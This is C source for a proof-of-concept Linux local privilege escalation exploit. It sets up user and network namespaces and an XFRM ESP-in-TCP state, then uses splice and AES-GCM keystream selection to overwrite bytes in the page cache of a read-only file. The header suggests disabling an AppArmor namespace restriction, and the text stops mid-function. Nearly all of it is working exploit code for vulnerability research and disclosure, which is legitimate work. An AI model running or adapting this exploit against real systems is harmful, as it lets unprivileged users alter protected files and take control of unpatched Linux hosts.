// Fragnesia: universal Linux LPE
// Ubuntu users: AppArmor interferes with using namespaces, you need to use
// `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`.
//
// You can chain other bugs to bypass this requirement but this is out of scope for this vulnerability.
//
// Found with V12 by William Bowling on the V12 team
// V12 - https://v12.sh - dangerously powerful agentic security

// Patch: https://lists.openwall.net/netdev/2026/05/13/79

/*
 * Slim ESP-in-TCP/TCP-coalesce page-cache replacement PoC.
 *
 * It only targets an already prepared disposable regular file under /tmp or
 * /var/tmp.  The file must be readable by the caller and should be non-writable
 * to demonstrate the permission boundary.
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -static xfrm_espintcp_pagecache_replace.c -o xfrm_espintcp_pagecache_replace
 *
 * Run:
 *   ./xfrm_espintcp_pagecache_replace /tmp/root-owned-copy 0 42434445
 *
 * Exit codes:
 *   1: vulnerable behavior verified
 *   0: fixed/no mutation observed
 *   2: local setup or argument error
 *   4: namespace/XFRM gate closed
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#if __has_include(<linux/if_alg.h>)
#include <linux/if_alg.h>
#else
#include <linux/types.h>
struct sockaddr_alg {
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};
#endif
#include <linux/netlink.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef NETLINK_XFRM
#define NETLINK_XFRM 6
#endif

#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define FRAG_LEN 4096
#define ESP_GCM_ICV_LEN 16
#define ESP_GCM_ENCRYPTED_LEN (FRAG_LEN - ESP_GCM_ICV_LEN)
#define TCP_PORT 5556

#define PAYLOAD_LEN         192
#define FRAME_PAYLOAD_ROWS  12      /* ceil(PAYLOAD_LEN / 16) */
#define FRAME_BAR_W         50
#define FRAME_LINES         15      /* 1 header + 12 hex + 1 bar + 1 sep */

#define RECEIVER_PRE_ULP_US 30000
#define SENDER_PRE_SPLICE_US 1000
#define RECEIVER_POST_ULP_US 30000

static const unsigned char xfrm_aead_key[20] = {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

static unsigned char active_esp_gcm_iv[8] = {
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
static uint32_t active_esp_seq = 1;
static const char *target_file;
static char target_file_buf[PATH_MAX];
static loff_t target_splice_off;

static uint16_t stream0_nonce[256];
static bool stream0_have[256];

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(2);
}

static void gate_fail(const char *what)
{
	printf("namespace_gate_failed: %s errno=%d (%s)\n",
	       what, errno, strerror(errno));
	exit(4);
}

static void store_be32(unsigned char *p, uint32_t v)
{
	p[0] = (unsigned char)(v >> 24);
	p[1] = (unsigned char)(v >> 16);
	p[2] = (unsigned char)(v >> 8);
	p[3] = (unsigned char)v;
}

/* ANSI colours */
#define C_RESET  "\033[0m"
#define C_BOLD   "\033[1m"
#define C_DIM    "\033[2m"
#define C_RED    "\033[31m"
#define C_GREEN  "\033[32m"
#define C_YELLOW "\033[33m"
#define C_CYAN   "\033[36m"
#define C_WHITE  "\033[97m"
#define C_BRED   "\033[1;31m"
#define C_BGRN   "\033[1;32m"
#define C_BYLW   "\033[1;33m"
#define C_BCYN   "\033[1;36m"
#define C_BWHT   "\033[1;97m"

static void print_hex_bytes(const char *label, const unsigned char *buf,
			    size_t len)
{
	size_t i;

	printf(C_DIM "%s=" C_RESET C_CYAN, label);
	for (i = 0; i < len; i++)
		printf("%02x", buf[i]);
	printf(C_RESET "\n");
}

/* Dump a 16-byte aligned row centred on `highlight_off`, marking that byte. */
static void print_hex_row(const char *path, uint64_t highlight_off,
			  const char *before_label, unsigned char before_val,
			  const char *after_label,  unsigned char after_val)
{
	uint64_t row_start = highlight_off & ~(uint64_t)15;
	unsigned char row[16];
	ssize_t got;
	size_t col;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	got = pread(fd, row, sizeof(row), (off_t)row_start);
	close(fd);
	if (got <= 0)
		return;

	/* Hex section */
	printf(C_DIM "  %016llx  " C_RESET, (unsigned long long)row_start);
	for (col = 0; col < 16; col++) {
		if (col == 8)
			printf(" ");
		if ((size_t)got > col) {
			if (row_start + col == highlight_off)
				printf(C_BRED "[%02x]" C_RESET, row[col]);
			else
				printf(C_DIM "%02x " C_RESET, row[col]);
		} else {
			printf(C_DIM "   " C_RESET);
		}
	}

	/* ASCII section */
	printf("  " C_DIM "|" C_RESET);
	for (col = 0; col < (size_t)got; col++) {
		unsigned char c = row[col];
		if (row_start + col == highlight_off)
			printf(C_BRED "%c" C_RESET,
			       (c >= 0x20 && c < 0x7f) ? c : '.');
		else
			printf(C_DIM "%c" C_RESET,
			       (c >= 0x20 && c < 0x7f) ? c : '.');
	}
	printf(C_DIM "|" C_RESET "\n");

	/* Annotation line */
	size_t col_off = (size_t)(highlight_off - row_start);
	size_t arrow_pos = 20 + col_off * 3 + (col_off >= 8 ? 1 : 0) + 1;
	printf("%*s" C_BYLW "^-- +%04llx  "
	       C_RED "%s" C_RESET ":" C_BRED "%02x" C_RESET
	       "  ->  "
	       C_GREEN "%s" C_RESET ":" C_BGRN "%02x" C_RESET "\n",
	       (int)arrow_pos, "",
	       (unsigned long long)(highlight_off & 0xffff),
	       before_label, before_val,
	       after_label, after_val);
}

static int open_afalg_aes_ecb(void)
{
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
	};
	int fd;

	fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("socket(AF_ALG)");

	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "ecb(aes)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind AF_ALG ecb(aes)");
	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_aead_key, 16) < 0)
		die("setsockopt AF_ALG key");

	return fd;
}

static void afalg_aes_encrypt_block(int alg_fd, const unsigned char in[16],
				    unsigned char out[16])
{
	char cbuf[CMSG_SPACE(sizeof(uint32_t))] = {};
	struct iovec iov = {
		.iov_base = (void *)in,
		.iov_len = 16,
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = cbuf,
		.msg_controllen = sizeof(cbuf),
	};
	struct cmsghdr *cmsg;
	uint32_t op = ALG_OP_ENCRYPT;
	ssize_t ret;
	int op_fd;

	op_fd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
	if (op_fd < 0)
		die("accept AF_ALG");

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(op));
	memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

	ret = sendmsg(op_fd, &msg, 0);
	if (ret != 16)
		die("sendmsg AF_ALG block");
	ret = read(op_fd, out, 16);
	if (ret != 16)
		die("read AF_ALG block");

	close(op_fd);
}

static unsigned char aes_gcm_stream0_byte(int alg_fd,
					  const unsigned char iv[8])
{
	unsigned char counter_block[16], stream[16];

	memcpy(counter_block, &xfrm_aead_key[16], 4);
	memcpy(counter_block + 4, iv, 8);
	store_be32(counter_block + 12, 2);
	afalg_aes_encrypt_block(alg_fd, counter_block, stream);
	return stream[0];
}

static void build_stream0_table(void)
{
	unsigned char iv[8] = {
		0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
	};
	unsigned int count = 0, nonce;
	int alg_fd;

	alg_fd = open_afalg_aes_ecb();
	for (nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
		unsigned char b;

		store_be32(iv + 4, nonce);
		b = aes_gcm_stream0_byte(alg_fd, iv);
		if (stream0_have[b])
			continue;
		stream0_have[b] = true;
		stream0_nonce[b] = (uint16_t)nonce;
		count++;
	}
	close(alg_fd);

	if (count != 256) {
		fprintf(stderr, "failed to build complete stream-byte table: %u/256\n",
			count);
		exit(2);
	}
	printf("stream0_table_entries=256\n");
}

static void choose_iv_for_stream0(unsigned char need_stream)
{
	uint16_t nonce = stream0_nonce[need_stream];

	memset(active_esp_gcm_iv, 0xcc, sizeof(active_esp_gcm_iv));
	store_be32(active_esp_gcm_iv + 4, nonce);
	printf("byte_flip_nonce=%u stream_byte=%02x\n", nonce, need_stream);
	print_hex_bytes("byte_flip_packet_iv", active_esp_gcm_iv,
			sizeof(active_esp_gcm_iv));
}

static uint64_t parse_u64_arg(const char *s, const char *name)
{
	char *end = NULL;
	unsigned long long v;

	if (s[0] == '-') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	errno = 0;
	v = strtoull(s, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	return (uint64_t)v;
}

static int hex_nibble(int c)
{
	if (c >= '0' && c <= '9')
		return c - '0';
	if (c >= 'a' && c <= 'f')
		return 10 + c - 'a';
	if (c >= 'A' && c <= 'F')
		return 10 + c - 'A';
	return -1;
}

static bool is_hex_separator(int c)
{
	return c == ':' || c == ',' || c == '-' || c == '_' ||
	       c == ' ' || c == '\t' || c == '\n' || c == '\r';
}

static unsigned char *parse_hex_bytes_arg(const char *s, size_t *len_out)
{
	size_t cap = strlen(s) / 2 + 1, len = 0;
	unsigned char *buf;
	int hi = -1, v;

	buf = malloc(cap);
	if (!buf)
		die("malloc desired bytes");

	for (; *s; s++) {
		if (is_hex_separator((unsigned char)*s))
			continue;
		if (hi < 0 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) {
			s++;
			continue;
		}

		v = hex_nibble((unsigned char)*s);
		if (v < 0) {
			fprintf(stderr, "invalid hex byte string near '%c'\n", *s);
			exit(2);
		}
		if (hi < 0) {
			hi = v;
			continue;
		}
		buf[len++] = (unsigned char)((hi << 4) | v);
		hi = -1;
	}

	if (hi >= 0) {
		fprintf(stderr, "hex byte string has an odd number of nibbles\n");
		exit(2);
	}
	if (len == 0) {
		fprintf(stderr, "hex byte string is empty\n");
		exit(2);
	}

	*len_out = len;
	return buf;
}

static unsigned char read_byte_at(const char *path, uint64_t off)
{
	unsigned char b;
	ssize_t ret;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open read byte");
	ret = pread(fd, &b, 1, (off_t)off);
	if (ret < 0)
		die("pread byte");
	if (ret != 1) {
		fprintf(stderr, "short pread at offset=%llu\n",
			(unsigned long long)off);
		exit(2);
	}
	close(fd);
	return b;
}

static void print_file_sample(const char *label, uint64_t off, size_t len)
{
	unsigned char buf[32];
	ssize_t ret;
	int fd;

	if (len > sizeof(buf))
		len = sizeof(buf);
	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open sample");
	ret = pread(fd, buf, len, (off_t)off);
	if (ret < 0)
		die("pread sample");
	close(fd);
	if ((size_t)ret != len) {
		fprintf(stderr, "short sample at offset=%llu len=%zu got=%zd\n",
			(unsigned long long)off, len, ret);
		exit(2);
	}
	print_hex_bytes(label, buf, len);
}

static uint64_t use_existing_target(const char *path)
{
	struct stat lst, st;

	if (lstat(path, &lst) < 0)
		die("lstat target");
	if (!S_ISREG(lst.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (stat(path, &st) < 0)
		die("stat target");
	if (!S_ISREG(st.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (st.st_size < FRAG_LEN) {
		fprintf(stderr, "target is too small: size=%lld need>=%d\n",
			(long long)st.st_size, FRAG_LEN);
		exit(2);
	}
	if (snprintf(target_file_buf, sizeof(target_file_buf), "%s", path) >=
	    (int)sizeof(target_file_buf)) {
		fprintf(stderr, "target path is too long\n");
		exit(2);
	}

	target_file = target_file_buf;
	return (uint64_t)st.st_size;
}

static void verify_write_denied(const char *label)
{
	int fd;

	errno = 0;
	fd = open(target_file, O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		close(fd);
		printf("namespace_gate_failed: %s write-open unexpectedly succeeded\n",
		       label);
		exit(4);
	}

	printf("%s_write_open_denied=1 errno=%d (%s)\n",
	       label, errno, strerror(errno));
}

static int write_all_file_status(const char *path, const char *buf)
{
	size_t len = strlen(buf);
	int fd, saved_errno;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	if (write(fd, buf, len) != (ssize_t)len) {
		saved_errno = errno;
		close(fd);
		errno = saved_errno;
		return -1;
	}
	close(fd);
	return 0;
}

static void sync_write_byte(int fd)
{
	char c = 'M';

	if (write(fd, &c, 1) != 1)
		die("sync write");
	close(fd);
}

static void sync_read_byte(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("sync read");
	close(fd);
}

static void parent_map_write_or_exit(pid_t child, const char *name,
				     const char *data)
{
	char path[128];

	snprintf(path, sizeof(path), "/proc/%ld/%s", (long)child, name);
	if (write_all_file_status(path, data) < 0) {
		printf("namespace_gate_failed: %s errno=%d (%s)\n",
		       path, errno, strerror(errno));
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		exit(4);
	}
}

static void enter_mapped_userns(void)
{
	uid_t outer_uid = getuid();
	gid_t outer_gid = getgid();
	int ready_pipe[2], mapped_pipe[2], status;
	char map[128];
	pid_t child;

	if (pipe(ready_pipe) < 0)
		die("pipe ready");
	if (pipe(mapped_pipe) < 0)
		die("pipe mapped");

	child = fork();
	if (child < 0)
		die("fork userns mapper");

	if (child > 0) {
		close(ready_pipe[1]);
		close(mapped_pipe[0]);

		sync_read_byte(ready_pipe[0]);

		snprintf(map, sizeof(map), "0 %u 1\n", outer_uid);
		parent_map_write_or_exit(child, "uid_map", map);
		parent_map_write_or_exit(child, "setgroups", "deny\n");
		snprintf(map, sizeof(map), "0 %u 1\n", outer_gid);
		parent_map_write_or_exit(child, "gid_map", map);

		sync_write_byte(mapped_pipe[1]);

		if (waitpid(child, &status, 0) < 0)
			die("wait userns child");
		if (WIFEXITED(status))
			exit(WEXITSTATUS(status));
		if (WIFSIGNALED(status)) {
			fprintf(stderr, "userns child killed by signal %d\n",
				WTERMSIG(status));
			exit(2);
		}
		exit(2);
	}

	close(ready_pipe[0]);
	close(mapped_pipe[1]);

	if (unshare(CLONE_NEWUSER) < 0)
		gate_fail("unshare(CLONE_NEWUSER)");

	sync_write_byte(ready_pipe[1]);
	sync_read_byte(mapped_pipe[0]);

	if (setresgid(0, 0, 0) < 0)
		gate_fail("setresgid 0 in userns");
	if (setresuid(0, 0, 0) < 0)
		gate_fail("setresuid 0 in userns");

	printf("userns_setup: outer_uid=%u outer_gid=%u ns_uid=%d ns_gid=%d\n",
	       outer_uid, outer_gid, getuid(), getgid());
}

static void bring_loopback_up(void)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		gate_fail("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		gate_fail("SIOCGIFFLAGS lo");
	ifr.ifr_flags |= IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		gate_fail("SIOCSIFFLAGS lo up");
	close(fd);

	printf("loopback_up=1\n");
}

static void add_nlattr(struct nlmsghdr *nlh, size_t maxlen,
		       unsigned short type, const void *data, size_t len)
{
	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
	struct nlattr *nla;

	if (off + NLA_HDRLEN + len > maxlen) {
		fprintf(stderr, "netlink message too small\n");
		exit(2);
	}

	nla = (struct nlattr *)((char *)nlh + off);
	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
}

static int nl_ack_errno(char *buf, ssize_t len)
{
	struct nlmsghdr *nlh;
	struct nlmsgerr *err;

	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
	     nlh = NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_type != NLMSG_ERROR)
			continue;
		err = (struct nlmsgerr *)NLMSG_DATA(nlh);
		if (err->error == 0)
			return 0;
		errno = -err->error;
		return -1;
	}

	errno = EPROTO;
	return -1;
}

static void add_xfrm_espintcp_state(void)
{
	char reqbuf[4096], resp[4096];
	char aeadbuf[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_aead_key)];
	struct sockaddr_nl sa = {
		.nl_family = AF_NETLINK,
	};
	struct xfrm_usersa_info *xs;
	struct xfrm_algo_aead *aead;
	struct xfrm_encap_tmpl encap;
	struct nlmsghdr *nlh;
	ssize_t ret;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh = (struct nlmsghdr *)reqbuf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*xs));
	nlh->nlmsg_type = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq = 1;

	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, "::1", &xs->saddr.in6) != 1)
		die("inet_pton saddr");
	if (inet_pton(AF_INET6, "::1", &xs->id.daddr.in6) != 1)
		die("inet_pton daddr");
	xs->id.spi = htonl(0x100);
	xs->id.proto = IPPROTO_ESP;
	xs->family = AF_INET6;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->reqid = 1;
	xs->lft.soft_byte_limit = XFRM_INF;
	xs->lft.hard_byte_limit = XFRM_INF;
	xs->lft.soft_packet_limit = XFRM_INF;
	xs->lft.hard_packet_limit = XFRM_INF;

	memset(aeadbuf, 0, sizeof(aeadbuf));
	aead = (struct xfrm_algo_aead *)aeadbuf;
	snprintf(aead->alg_name, sizeof(aead->alg_name), "rfc4106(gcm(aes))");
	aead->alg_key_len = sizeof(xfrm_aead_key) * 8;
	aead->alg_icv_len = 128;
	memcpy(aead->alg_key, xfrm_aead_key, sizeof(xfrm_aead_key));
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ALG_AEAD, aeadbuf, sizeof(aeadbuf));

	memset(&encap, 0, sizeof(encap));
	encap.encap_type = TCP_ENCAP_ESPINTCP;
	encap.encap_sport = htons(TCP_PORT);
	encap.encap_dport = htons(TCP_PORT);
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ENCAP, &encap, sizeof(encap));

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		gate_fail("socket(NETLINK_XFRM)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		gate_fail("bind(NETLINK_XFRM)");

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	ret = sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa,
		     sizeof(sa));
	if (ret < 0)
		gate_fail("sendto XFRM_MSG_NEWSA");
	if (ret != (ssize_t)nlh->nlmsg_len) {
		errno = EIO;
		gate_fail("short sendto XFRM_MSG_NEWSA");
	}

	ret = recv(fd, resp, sizeof(resp), 0);
	if (ret < 0)
		gate_fail("recv XFRM ack");
	if (nl_ack_errno(resp, ret) < 0)
		gate_fail("XFRM_MSG_NEWSA ack");
	close(fd);

	printf("xfrm_espintcp_state_add=1\n");
}

static void setup_user_netns_xfrm(void)
{
	if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) < 0)
		die("prctl PR_SET_DUMPABLE");
	enter_mapped_userns();

	if (unshare(CLONE_NEWNET) < 0)
		gate_fail("unshare(CLONE_NEWNET)");

	printf("netns_setup=1\n");
	bring_loopback_up();
	add_xfrm_espintcp_state();
	printf("namespace_setup_complete=1\n");
}

static void write_ready(int fd)
{
	char c = 'R';

	if (write(fd, &c, 1) != 1)
		die("ready write");
	close(fd);
}

static void wait_ready(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("ready read");
	close(fd);
}

static void receiver(int ready_write_fd)
{
	struct sockaddr_in6 addr = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	char ulp[] = "espintcp";
	int fd, cfd, one = 1;

	fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("receiver socket");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("receiver reuseaddr");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("receiver bind");
	if (listen(fd, 1) < 0)
		die("receiver listen");

	write_ready(ready_write_fd);

	cfd = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
	if (cfd < 0)
		die("receiver accept");

	usleep(RECEIVER_PRE_ULP_US);
	if (setsockopt(cfd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("receiver TCP_ULP espintcp");

	printf("receiver_ns_uid=%d euid=%d espintcp_enabled_after_queue=1\n",
	       getuid(), geteuid());
	usleep(RECEIVER_POST_ULP_US);
	close(cfd);
	close(fd);
	_exit(0);
}

static void sender(int ready_read_fd)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	struct {
		__be16 len;
		unsigned char esp[16];
	} prefix;
	loff_t off, start_off;
	int fd, sock, p[2], one = 1;
	ssize_t ret, sent;

	wait_ready(ready_read_fd);

	memset(&prefix, 0xcc, sizeof(prefix));
	prefix.len = htons(sizeof(prefix) + FRAG_LEN);
	prefix.esp[0] = 0x00;
	prefix.esp[1] = 0x00;
	prefix.esp[2] = 0x01;
	prefix.esp[3] = 0x00;
	store_be32(&prefix.esp[4], active_esp_seq);
	memcpy(&prefix.esp[8], active_esp_gcm_iv, sizeof(active_esp_gcm_iv));

	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("sender open target");
	sock = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (sock < 0)
		die("sender socket");
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0)
		die("sender TCP_NODELAY");
	if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect");

	sent = send(sock, &prefix, sizeof(prefix), 0);
	if (sent != (ssize_t)sizeof(prefix))
		die("sender send prefix");

	usleep(SENDER_PRE_SPLICE_US);

	if (pipe(p) < 0)
		die("sender pipe");
	off = target_splice_off;
	start_off = off;
	ret = splice(fd, &off, p[1], NULL, FRAG_LEN, 0);
	if (ret != FRAG_LEN)
		die("sender splice file to pipe");

	ret = splice(p[0], NULL, sock, NULL, FRAG_LEN, 0);
	if (ret < 0)
		die("sender splice pipe to tcp");

	printf("sender_ns_uid=%d euid=%d prefix_send=%zd splice_to_tcp=%zd file_off=%lld file_off_next=%lld\n",
	       getuid(), geteuid(), sent, ret, (long long)start_off,
	       (long long)off);

	close(p[0]);
	close(p[1]);
	close(sock);
	close(fd);
	_exit(ret == FRAG_LEN ? 0 : 3);
}

static int run_trigger_pair(void)
{
	int pipefd[2], st_rx, st_tx;
	pid_t rx, tx;

	if (pipe(pipefd) < 0)
		die("pipe");

	rx = fork();
	if (rx < 0)
		die("fork receiver");
	if (rx == 0) {
		close(pipefd[0]);
		receiver(pipefd[1]);
	}

	tx = fork();
	if (tx < 0)
		die("fork sender");
	if (tx == 0) {
		close(pipefd[1]);
		sender(pipefd[0]);
	}

	close(pipefd[0]);
	close(pipefd[1]);
	if (waitpid(tx, &st_tx, 0) < 0)
		die("wait sender");
	if (waitpid(rx, &st_rx, 0) < 0)
		die("wait receiver");

	printf("sender_status=%d receiver_status=%d\n", st_tx, st_rx);
	if (!WIFEXITED(st_tx) || WEXITSTATUS(st_tx) != 0 ||
	    !WIFEXITED(st_rx) || WEXITSTATUS(st_rx) != 0)
		return -1;
	return 0;
}

static uint64_t checked_byte_range_last(uint64_t byte_off, size_t byte_len)
{
	uint64_t n = (uint64_t)byte_len;

	if (n == 0) {
		fprintf(stderr, "byte range is empty\n");
		exit(2);
	}
	if (n - 1 > UINT64_MAX - byte_off) {
		fprintf(stderr, "byte range overflows uint64_t\n");
		exit(2);
	}
	return byte_off + n - 1;
}

static void draw_smash_frame(const unsigned char *desired, size_t desired_len,
			     const unsigned char *live, size_t idx_current,
			     size_t changed, size_t skipped, int first_draw)
{
	size_t done   = changed + skipped;
	size_t filled = desired_len ? done * FRAME_BAR_W / desired_len : FRAME_BAR_W;
	size_t row, col, bi, i;

	/* Save cursor, jump to row 1, buffer the whole frame into one write. */
	static char frame_buf[8192];
	setvbuf(stdout, frame_buf, _IOFBF, sizeof(frame_buf));
	if (!first_draw)
		printf("\033[s\033[?25l\033[1;1H");

	/* ── header ─────────────────────────────────────────────────── */
	printf("\r\033[2K" C_BCYN "[*]" C_RESET
	       " smashing %zu bytes into read-only page cache"
	       "  changed=" C_BGRN "%zu" C_RESET
	       "  skipped=" C_DIM "%zu" C_RESET
	       "  remaining=" C_BYLW "%zu" C_RESET "\n",
	       desired_len, changed, skipped,
	       done < desired_len ? desired_len - done : (size_t)0);

	/* ── hex dump ────────────────────────────────────────────────── */
	for (row = 0; row < FRAME_PAYLOAD_ROWS; row++) {
		/* col-0 highlight borrows the header's last trailing space */
		int col0_hi = (idx_current < desired_len &&
			       row * 16 == idx_current);
		printf("\r\033[2K" C_DIM "  %04zx%s" C_RESET,
		       row * 16, col0_hi ? " " : "  ");

		for (col = 0; col < 16; col++) {
			bi = row * 16 + col;
			int cur = (idx_current < desired_len && bi == idx_current);

			if (col == 8) {
				/* mid-gap space becomes '[' when col 8 is current */
				printf(cur ? "[" : " ");
				if (cur) {
					printf(C_BYLW "%02x]" C_RESET, live[bi]);
					continue;
				}
			}

			if (bi >= desired_len) { printf("   "); continue; }

			if (bi < idx_current) {
				printf(live[bi] == desired[bi]
				       ? C_BGRN "%02x " C_RESET
				       : C_BRED "%02x " C_RESET, live[bi]);
			} else if (cur) {
				/* col 0: '[' was the header's borrowed space
				 * col 1-7, 9-15: '\b' eats the preceding byte's space */
				printf(col == 0
				       ? C_BYLW "[%02x]" C_RESET
				       : "\b" C_BYLW "[%02x]" C_RESET, live[bi]);
			} else {
				printf(C_DIM "%02x " C_RESET, desired[bi]);
			}
		}
		printf("\n");
	}

	/* ── progress bar ────────────────────────────────────────────── */
	printf("\r\033[2K  [" C_BGRN);
	for (i = 0; i < filled; i++)          printf("=");
	printf(C_RESET C_DIM);
	for (i = filled; i < FRAME_BAR_W; i++) printf("-");
	printf(C_RESET "] " C_BWHT "%zu" C_RESET "/" C_DIM "%zu" C_RESET " (%zu%%)\n",
	       done, desired_len,
	       desired_len ? done * 100 / desired_len : (size_t)100);

	/* ── separator ───────────────────────────────────────────────── */
	printf("\r\033[2K" C_DIM
	       "────────────────────────────────────────────────────────────"
	       C_RESET "\n");

	fflush(stdout);
	setvbuf(stdout, NULL, _IONBF, 0);
	if (!first_draw)
		printf("\033[?25h\033[u");  /* restore cursor to log area */
}

static int replace_existing_bytes_after(uint64_t byte_off,
					const unsigned char *desired,
					size_t desired_len,
					uint64_t file_size)
{
	uint64_t last = checked_byte_range_last(byte_off, desired_len);
	size_t idx, changed = 0, skipped = 0;
	unsigned char live_state[PAYLOAD_LEN];
	int fd_init;

	if (last >= file_size) {
		fprintf(stderr, "byte range outside target: offset=%llu len=%zu size=%llu\n",
			(unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}
	if (last > file_size - FRAG_LEN) {
		fprintf(stderr,
			"collateral-after mode requires requested range end <= size-%d: offset=%llu len=%zu size=%llu\n",
			FRAG_LEN, (unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}

